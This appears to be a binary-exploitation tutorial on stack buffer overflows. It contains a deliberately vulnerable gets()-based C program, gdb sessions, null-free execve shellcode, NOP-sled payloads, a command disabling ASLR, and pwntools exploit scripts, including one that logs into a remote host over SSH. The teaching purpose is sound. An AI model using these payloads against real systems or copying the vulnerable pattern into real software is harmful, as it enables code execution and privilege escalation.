# Stack overflow

Stack overflow is about a buffer overflow vulnerability which purpose is not to overwrite variables after the buffer, but also to overwrite the saved return address.

## Jump to an arbitrary address

Let's try to jump to an arbitrary address of our program text section.

Consider this program:
```C
#include <unistd.h>
#include <string.h>

// gcc stack-overflow.c -o stack-overflow -fno-stack-protector -no-pie

// Function that sets user id to 0 and execute the shell
void shell(){
  setuid(0);
  system("/bin/sh");
}

void vuln_func(){
  char vuln_buff[250];
  // vulnerable
  gets(vuln_buff);
}

int main(int argc, char *argv[]){
  vuln_func();
  return 0;
}
```

So, here we have a vulnerable function `vuln_func` that does the same stuff from the buffer overflow section. But now we will overflow the buffer and overwrite the return address to jump to an arbitrary address of the program. This address will be the address of the beginning of the `shell` function. Thus, when we overflow the buffer and overwrite the return address after the `vuln_func` completes its execution, it will take the new return address and jump to the shell function.

To determine the offset just do next in gdb:
```bash
gef➤  r < <(python -c 'print "A"*250 + "B"*16')
Starting program: /home/shogun/repos/basics-of-pwn/content/stack-overflow/stack-overflow < <(python -c 'print "A"*250 + "B"*16')

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
```

My offset is 12 bytes. The next 4 bytes will overwrite the return address. You can have a different offset.

Next, find the start address of `shell` function:
```bash
gef➤  disas shell
Dump of assembler code for function shell:
   0x080491d6 <+0>:	endbr32
   0x080491da <+4>:	push   ebp
   0x080491db <+5>:	mov    ebp,esp
   0x080491dd <+7>:	push   ebx
   0x080491de <+8>:	sub    esp,0x4
   0x080491e1 <+11>:	call   0x8049110 <__x86.get_pc_thunk.bx>
   0x080491e6 <+16>:	add    ebx,0x2e1a
   0x080491ec <+22>:	sub    esp,0xc
   0x080491ef <+25>:	push   0x0
   0x080491f1 <+27>:	call   0x80490b0 <setuid@plt>
   0x080491f6 <+32>:	add    esp,0x10
   0x080491f9 <+35>:	sub    esp,0xc
   0x080491fc <+38>:	lea    eax,[ebx-0x1ff8]
   0x08049202 <+44>:	push   eax
   0x08049203 <+45>:	call   0x8049090 <system@plt>
   0x08049208 <+50>:	add    esp,0x10
   0x0804920b <+53>:	nop
   0x0804920c <+54>:	mov    ebx,DWORD PTR [ebp-0x4]
   0x0804920f <+57>:	leave  
   0x08049210 <+58>:	ret    
End of assembler dump.
```

`0x080491d6` is that's what you need.

Then, try to replace last 4 bytes in payload on this address:
```bash
gef➤  r < <(python -c 'print "A"*250 + "B"*12 + "\xd6\x91\x04\x08"')
Starting program: /home/shogun/repos/basics-of-pwn/content/stack-overflow/stack-overflow < <(python -c 'print "A"*250 + "B"*12 + "\xd6\x91\x04\x08"')
[Detaching after vfork from child process 6753]

Program received signal SIGSEGV, Segmentation fault.
0xf7fa8000 in ?? () from /lib/i386-linux-gnu/libc.so.6
```

Segmentation fault is nothing because you can see that the gdb shows you detaching. It means that the shell is executed.

Again, you have a shell, or if this program would be with SUID bit set, you would get the root or another user who is owned this program.

### Why is this happening?

Programming languages such as C, in which the High-level language instructions map to typical machine language do not provide any mechanism to identify if the buffer (char array) declared on to the stack, can take the input more than was it was supposed to take. The reason for non-checking such sort of mechanism was to achieve the speed part of the machine language.

Stack overflow things:

1. C does not check buffer overflow.
2. Buffers are stored in a lower to a higher memory address.
3. Just after the buffer, after overflowing it to a certain amount can update saved variables, old EBP register value, and return address.
4. If the return address is changed we can change the control flow.

## Shellcode writing

Now, when you can jump to an arbitrary address, you might think that you can jump to your input data. Yes, you can. But what will your input data look like? Your input data needs to be low-level compiled assembly code that is the same as a chain of opcodes. But also, let's understand what a shellcode and a payload are.

Shellcode is a small piece of payload in binary language that is used to inject to vulnerable binary files. Or the same as I said above about the input data.

A payload contains the shellcode, the offset(to fill the buffer to overwrite the return address), and the return address itself. A payload definition is flexible and depends on the vulnerability. I'll just make a note of how it will look in further vulnerabilities.

Steps to write shellcode:

1. Write desired shellcode in a high-level language.
2. Compile and disassemble the high-level shellcode program.
3. Analyze how the program works from an assembly level.
4. Clean up the assembly to make it smaller and injectable.
5. Extract opcodes and create shellcode.

Let's walk through these steps.

### Write desired shellcode in a high-level language

Shellcode in C:
```C
#include <stdlib.h>

// gcc high-level-shellcode.c -o high-level-shellcode
// use -m32 to compile in 64-bit

int main(){
  // Start a new process /bin/sh or just spawn a shell
  execve("/bin/sh", NULL, NULL);
  // Exit normally
  exit(0);
}
```

### Compile and disassemble the high-level shellcode program

I compiled it in 32-bit with `gcc high-level-shellcode.c -o high-level-shellcode -m32` because it is easy to explain and with the 64-bit it is the same. Disassembly it with `objdump -d high-level -M intel`, then find the main function.

### Analyze how the program works from an assembly level

The main function:
```bash
000011ed <main>:
    11ed:	f3 0f 1e fb          	endbr32
    11f1:	8d 4c 24 04          	lea    ecx,[esp+0x4]
    11f5:	83 e4 f0             	and    esp,0xfffffff0
    11f8:	ff 71 fc             	push   DWORD PTR [ecx-0x4]
    11fb:	55                   	push   ebp
    11fc:	89 e5                	mov    ebp,esp
    11fe:	53                   	push   ebx
    11ff:	51                   	push   ecx
    1200:	e8 eb fe ff ff       	call   10f0 <__x86.get_pc_thunk.bx>
    1205:	81 c3 cf 2d 00 00    	add    ebx,0x2dcf
    120b:	83 ec 04             	sub    esp,0x4
    120e:	6a 00                	push   0x0
    1210:	6a 00                	push   0x0
    1212:	8d 83 34 e0 ff ff    	lea    eax,[ebx-0x1fcc]
    1218:	50                   	push   eax
    1219:	e8 82 fe ff ff       	call   10a0 <execve@plt>
    121e:	83 c4 10             	add    esp,0x10
    1221:	83 ec 0c             	sub    esp,0xc
    1224:	6a 00                	push   0x0
    1226:	e8 55 fe ff ff       	call   1080 <exit@plt>
    122b:	66 90                	xchg   ax,ax
    122d:	66 90                	xchg   ax,ax
    122f:	90                   	nop
```

So, the main part here starts at `push 0x0`. The `execve()` function is just a system call. And it has its standard. Here, you see that the program pushes two zeros into the stack and then pushes the EAX, which is just a pointer to our `/bin/sh`. Then it does `call 10a0 <execve@plt>` which is moves the number of a system call in the EAX register and sends interruption to execute a system call(The CPU switches to kernel mode).

As this 32-bit syscall table says the standard for an execve system call:

```
---------------eax-----ebx-------ecx-----edx--
| sys_execve | 0x0b | filename | argv | envp |   
----------------------------------------------
```

In our disassembly code, arguments are pushed onto the stack, but by the standard, they can be in registers as above.

After the execve syscall, the stack cleans and a new syscall `exit()` will execute with 0 as an argument. Something after that doesn't matter.

Let's follow the rules we encountered above and write the shellcode.

Shellcode:
```nasm
; nasm -f elf32 dirty-low-level-shellcode.asm
; ld -m elf_i386 dirty-low-level-shellcode.o -o dirty-low-level-shellcode

; push the string '/bin/sh\0
  push 0x68732f00
  push 0x6e69622f
; move the first argument (/bin//sh) to ebx
  mov ebx, esp
; push address of the string
  push ebx
; move the second argument (argv array) to ecx
  mov ecx, esp
; move to eax the number of the syscall
  mov eax, 0xb
; do interruption
  int 0x80
```

You need to extract opcodes:
```bash
# Assemble the file
nasm -f elf32 dirty-low-level-shellcode.asm
# Link an obj file
ld -m elf_i386 dirty-low-level-shellcode.o -o dirty-low-level-shellcode
# See the opcodes
objdump -d dirty-low-level-shellcode -M intel
```

Here, you don't need to link an obj file, you can disassembly it after assembling and extract the opcodes.

This chain of commands will extract the opcodes in the appropriate view:
```bash
objdump -d dirty-low-level-shellcode.o -M intel | grep '[0-9a-f]:' | grep -v 'file' | cut -f2 -d: | cut -f1-6 -d' '| tr -s ' ' | tr '\t' ' ' | sed 's/ $//g' | sed 's/ /\\x/g' | paste -d '' -s | sed 's/^/"/'| sed 's/$/"/g'
```

objdump listing:
```bash
dirty-low-level-shellcode:     file format elf32-i386


Disassembly of section .text:

08049000 <__bss_start-0x1000>:
 8049000:	68 00 2f 73 68       	push   $0x68732f00
 8049005:	68 2f 62 69 6e       	push   $0x6e69622f
 804900a:	89 e3                	mov    %esp,%ebx
 804900c:	53                   	push   %ebx
 804900d:	89 e1                	mov    %esp,%ecx
 804900f:	b8 0b 00 00 00       	mov    $0xb,%eax
 8049014:	cd 80                	int    $0x80
```

You got the shellcode. Next, you need to test it.
```C
#include <stdio.h>
#include <string.h>


unsigned char shellcode[] = "\x68\x00\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x53\x89\xe1\xb8\x0b\x00\x00\x00\xcd\x80";

void main(){
  printf("Shellcode length: %d\n", strlen(shellcode));
  // Declare a function pointer named ret
  // Then cast the shellcode pointer to the function pointer of the same size
  int (*ret)() = (int(*)())shellcode;
  // Call the function
  ret();
}
```

If you try to compile and execute it, you will end up with a shellcode length of 1 byte, which is not the true length of the shellcode. Why? The reason is that the shellcode is dirty, not injectable. When you enter a shellcode into a vulnerable program, the program prevents you from entering the complete shellcode because it stops accepting characters when it finds a null byte.

### Clean up the assembly to make it smaller and injectable

The reason that the shellcode is not injectable is that we have `push 0x68732f00`, `mov eax, 0xb` instructions. These instructions are assembled with the null bytes. So, we need to find another way to move zero and 0xb to the EAX register.

1. If you need to fill the register with zero value just don't do `mov` instruction and do `xor` on the register.

2. If you need to place a small value in the register don't use the EAX name of the register using `al` which is 8 bits size or 1 byte.

3. Replace '/bin/sh\0' string with '/bin//sh' and terminate it with null in the stack.

So, clean shellcode will be the following:
```nasm
; nasm -f elf32 clean-low-level-shellcode.asm
; ld -m elf_i386 clean-low-level-shellcode.o -o clean-low-levelshellcode

; move in eax zero to add to the end of the string to make it null-terminated
  xor eax, eax
; push zero to terminate the string
  push eax
; push the string '/bin//sh'
  push 0x68732f2f
  push 0x6e69622f
; move the first argument (/bin/sh) to ebx
  mov ebx, esp
; push zero
  push eax
; push the address of the string
  push ebx
; move the second argument (argv array) to ecx
  mov ecx, esp
; move to eax the number of the syscall
  mov al, 0xb
; do interruption
  int 0x80
```

Disassembly:
```bash
clean-low-level-shellcode:     file format elf32-i386


Disassembly of section .text:

08049000 <__bss_start-0x1000>:
 8049000:	31 c0                	xor    eax,eax
 8049002:	50                   	push   eax
 8049003:	68 2f 2f 73 68       	push   0x68732f2f
 8049008:	68 2f 62 69 6e       	push   0x6e69622f
 804900d:	89 e3                	mov    ebx,esp
 804900f:	50                   	push   eax
 8049010:	53                   	push   ebx
 8049011:	89 e1                	mov    ecx,esp
 8049013:	b0 0b                	mov    al,0xb
 8049015:	cd 80                	int    0x80
```

Test the shellcode:
```C
#include <stdio.h>
#include <string.h>


unsigned char shellcode[] = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";

void main(){
  printf("Shellcode length: %d\n", strlen(shellcode));
  // Declare a function pointer named ret
  // Then cast the shellcode pointer to the function pointer of the same size
  int (*ret)() = (int(*)())shellcode;
  // Call the function
  ret();
}
```

`test-dirty-shellcode` and `test-clean-shellcode` don't need to be executable, they execute with `Segmentation fault` stuff.

## Exploitation

We have a completed shellcode, let's use it. But first, recompile the program with the parameters: `gcc stack-overflow.c -o stack-overflow -fno-stack-protector -no-pie -z execstack -m32` to make stack executable.

Crash the program and find the address of the buffer within the stack:
```bash
gef➤  r < <(python -c 'print "A"*262 + "B"*4')
gef➤  x/50wx $esp - 0x14a
0xffffce66:	0x00000804	0x85800000	0xcfa8f7fa	0x7b24ffff
0xffffce76:	0xcea6f7fe	0xc000ffff	0x80000804	0x8000f7fa
0xffffce86:	0xcfa8f7fa	0x923affff	0xcea60804	0xcee0ffff
0xffffce96:	0x0003ffff	0x92240000	0xd0000804	0xe76cf7ff
0xffffcea6:	0x6850c031	0x68732f2f	0x69622f68	0x50e3896e
0xffffceb6:	0xb0e18953	0x4180cd0b	0x41414141	0x41414141
0xffffcec6:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffced6:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffcee6:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffcef6:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffcf06:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffcf16:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffcf26:	0x41414141	0x41414141
gef➤  r < <(python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "A" * 239 + "\xa6\xce\xff\xff"')
Starting program: /home/shogun/repos/basics-of-pwn/content/stack-overflow/stack-overflow < <(python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "A" * 239 + "\xa6\xce\xff\xff"')
process 8370 is executing new program: /bin/dash
[Inferior 1 (process 8370) exited normally]
gef➤  

```

So, my address is `0xffffcea6`. Then, I just placed the shellcode at the beginning of the buffer and jumped on it. You can see gdb said that the new program was executed.

Try it outside gdb. It doesn't work. Firstly, you need to disable security technique ASLR(`echo "0" | dd of=/proc/sys/kernel/randomize_va_space`). Secondly, gdb creates its own address space and there is an offset between the address in gdb and the real address of the executable.

Gdb has its env variables. So, we unset them with `unset environment`. '`LINES` and `COLUMNS` vars are the lines and columns of the terminal, and GDB sets them internally'.

```bash
gef➤  unset environment LINES
gef➤  unset environment COLUMNS
gef➤  r < <(python -c 'print "A"*262 + "B"*4')
gef➤  x/50wx $esp - 0x14a
0xffffce86:	0x00000804	0x85800000	0xcfc8f7fa	0x7b24ffff
0xffffce96:	0xcec6f7fe	0xc000ffff	0x80000804	0x8000f7fa
0xffffcea6:	0xcfc8f7fa	0x923affff	0xcec60804	0xcf00ffff
0xffffceb6:	0x0003ffff	0x92240000	0xd0000804	0xe76cf7ff
0xffffcec6:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffced6:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffcee6:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffcef6:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffcf06:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffcf16:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffcf26:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffcf36:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffcf46:	0x41414141	0x41414141
gef➤  r < <(python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "A" * 239 + "\xc6\xce\xff\xff"')
Starting program: /home/shogun/repos/basics-of-pwn/content/stack-overflow/stack-overflow < <(python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "A" * 239 + "\xc6\xce\xff\xff"')
process 8791 is executing new program: /bin/dash
[Inferior 1 (process 8791) exited normally]
```

Now, outside gdb:
```bash
$ (python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "A"*239 + "\x56\xcf\xff\xff"'; cat) | ./stack-overflow
```

Sometimes `unset environment` helps, sometimes doesn't. You could try to brute-force the address with some sort of script, but there is a better solution. And that's why we need the next subsection of stack overflow vulnerability.

## NOP chain

At this moment, you already have a working shellcode, you know the offset, and so on. But you need somehow figure out the address of the shellcode in the stack. Nop sled or chain will help you.

NOP is an instruction that does nothing and it means NO-OPERATION. So, you can guess that simply placing this instruction at the beginning of the shellcode will help you to easily exploit the vulnerability.

Let's try it:
```bash
gef➤  r < <(python -c 'print "\x90" * 100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "A" * 139 + "\xc6\xce\xff\xff"')
Starting program: /home/shogun/repos/basics-of-pwn/content/stack-overflow/stack-overflow < <(python -c 'print "\x90" * 100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "A" * 139 + "\xc6\xce\xff\xff"')

Breakpoint 1, 0x08049242 in vuln_func ()
```

```bash
gef➤  x/50wx $esp - 0x140
0xffffceac:	0xf7fa8580	0xffffcfe8	0xf7fe7b24	0xffffcee6
0xffffcebc:	0x0804c000	0xf7fa8000	0xf7fa8000	0xffffcfe8
0xffffcecc:	0x0804923a	0xffffcee6	0xffffcf20	0x00000003
0xffffcedc:	0x08049224	0xf7ffd000	0x9090e76c	0x90909090
0xffffceec:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffcefc:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffcf0c:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffcf1c:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffcf2c:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffcf3c:	0x90909090	0x90909090	0x90909090	0xc0319090
0xffffcf4c:	0x2f2f6850	0x2f686873	0x896e6962	0x895350e3
0xffffcf5c:	0xcd0bb0e1	0x41414180	0x41414141	0x41414141
0xffffcf6c:	0x41414141	0x41414141
gef➤  r < <(python -c 'print "\x90" * 100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "A" * 139 + "\x1c\xcf\xff\xff"')
Starting program: /home/shogun/repos/basics-of-pwn/content/stack-overflow/stack-overflow < <(python -c 'print "\x90" * 100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "A" * 139 + "\x1c\xcf\xff\xff"')

Breakpoint 1, 0x08049242 in vuln_func ()

gef➤  c
Continuing.
process 10186 is executing new program: /bin/dash
```

Now, you see the exploit works too with the NOP chain.

Outside gdb:
```bash
$ (python -c 'print "\x90" * 200 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "A"*39 + "\x56\xcf\xff\xff"'; cat) | ./stack-overflow
w
 16:44:33 up  2:08,  1 user,  load average: 0.43, 0.45, 0.42
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
shogun   tty7     :0               14:36    2:08m  7:11   3.52s xfce4-session
```

But, the nop-chain will work and help you if there is enough space in the vulnerable buffer. If there is not then you will need to find another way to exploit a vulnerability. Other techniques will be discussed later.

## pwntools

pwntools is an exploit development library. 'It is designed for rapid prototyping and development, and intended to make exploit writing as simple as possible.'

With pwntools, you can connect to the remote target via ssh or just to send some data to the known port. After connection, you can execute whatever you want with proper python code.

### Connect to a target

If ssh login is allowed:
```python
from pwn import *


con = ssh(username='username', host='hostname or ip-address', password='password', port=2222)
# then execute whatever you want
con.process('/bin/sh')
con.sendline('echo "hello world!"')
```

If the target is open port:
```python
from pwn import *


con = remote('hostname or ip-address', port=4444)
# Receive the data from the port
print(con.recv())
# Send a data to the port
print(con.sendline('A' * 100))
```

A buffer overflow exploit and jump exploit below.

### Remote exploit of buffer overflow with pwntools

```python
from pwn import *

# Connect to target via ssh
con = ssh('user', '192.168.43.61', password='user', port=22)
# Execute a vulnerable program
p = con.process('./buffer-overflow')
# Payload
payload = "A"*108 + "\xd2\x04"
# Send payload
p.sendline(payload)
# To attach with gdb to remote process
#gdb.attach(p, "b *main")
# Now, you can work with shell interactively
p.interactive()
```

One difference here is the offset between the buffer and the value to overwrite. This offset often can be different from the local exploit.

### Jump to an arbitrary address

```python
from pwn import *


# start the vuln program
p = process('./stack-overflow')
# shell function address
# p32 to convert an address to the little-endian format
shell_addr = p32(0x080491d6)
# fill the vuln buffer
payload = b'A' * 250
# add the offset
payload += b'B' * 12
# add a new return address
payload += shell_addr
# send to process
p.sendline(payload)
# Shell
p.interactive()
```

### Write shellcode faster

You can avoid writing shellcode whenever you need it. Try the `shellcraft` module.

```python
from pwn import *

# Specify the architecture
context.arch = 'i386'
# Create a shellcode
shellcode = shellcraft.sh()
print(shellcode)
# Assembly it
assembled_shellcode = asm(shellcode)
print(assembled_shellcode)
```

Output:
```bash
$ python3 fast-shellcode.py
    /* execve(path='/bin///sh', argv=['sh'], envp=0) */
    /* push b'/bin///sh\x00' */
    push 0x68
    push 0x732f2f2f
    push 0x6e69622f
    mov ebx, esp
    /* push argument array ['sh\x00'] */
    /* push 'sh\x00\x00' */
    push 0x1010101
    xor dword ptr [esp], 0x1016972
    xor ecx, ecx
    push ecx /* null terminate */
    push 4
    pop ecx
    add ecx, esp
    push ecx /* 'sh\x00' */
    mov ecx, esp
    xor edx, edx
    /* call execve() */
    push SYS_execve /* 0xb */
    pop eax
    int 0x80

b'jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80'
```

Now, with this you can do stack-overflow too easy:
```python
from pwn import *


# start the vuln program
p = process('./stack-overflow')
# address of the shellcode
ret_addr = p32(0xffffcf56)
# specify the architecture and generate the shellcode to execute /bin/sh
context.arch = 'i386'
shellcode = asm(shellcraft.sh())
payload = shellcode
# add the offset
payload += b'A' * (262 - len(shellcode))
# add a new return address
payload += ret_addr
# send to process
p.sendline(payload)
#gdb.attach(p, "b *main")
# Shell
p.interactive()
```

### Write in an assembly with pwntools shellcraft

Let's code `clean-low-level-shellcode.asm` with pwntools.

```python
from pwn import *


context.arch = 'i386'
# Just use shellcraft module and its methods which similar to assembly instructions
shellcode = shellcraft.mov('eax', 0)
shellcode += shellcraft.push('eax')
shellcode += shellcraft.push(0x68732f2f)
shellcode += shellcraft.push(0x6e69622f)
shellcode += shellcraft.mov('ebx', 'esp')
shellcode += shellcraft.push('eax')
shellcode += shellcraft.push('ebx')
shellcode += shellcraft.mov('ecx', 'esp')
shellcode += shellcraft.mov('al', 0xb)
shellcode += shellcraft.syscall()
print(shellcode)
print(asm(shellcode))
```

Output:
```bash
$ python3 assembly.py
    xor eax, eax
    push eax
    /* push 0x68732f2f */
    push 0x68732f2f
    /* push 0x6e69622f */
    push 0x6e69622f
    mov ebx, esp
    push eax
    push ebx
    mov ecx, esp
    mov al, 0xb
    /* call syscall() */
    int 0x80

b'1\xc0Ph//shh/bin\x89\xe3PS\x89\xe1\xb0\x0b\xcd\x80'
```

### Tools that come with pwntools

#### checksec

It allows you to see the security techniques used in the binary.

For instance, our `stack-overflow` program has these techniques:
```bash
$ checksec stack-overflow
[*] '/home/shogun/repos/basics-of-pwn/content/stack-overflow/stack-overflow'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```

#### cyclic

This tool is beautiful for determining the offset before the return address. Let's try to determine the offset with it in `stack-overflow` binary.

It generates a string with a set of unique patterns. 500 here is the length of the output string.
```bash
$ cyclic 500
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaae
```

Now, take the output and place it in gdb.
```bash
gef➤  r
Starting program: /home/shogun/repos/basics-of-pwn/content/stack-overflow/stack-overflow
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaae

Program received signal SIGSEGV, Segmentation fault.
0x61716361 in ?? ()
```

You got the address `0x61716361`. Next, use it to determine the offset.
```bash
$ cyclic -l 0x61716361
262
```

Thus, you determined the offset.

It has also implementation in python programming as `cyclic(500)` and `cyclic_find(0x61716361)`.
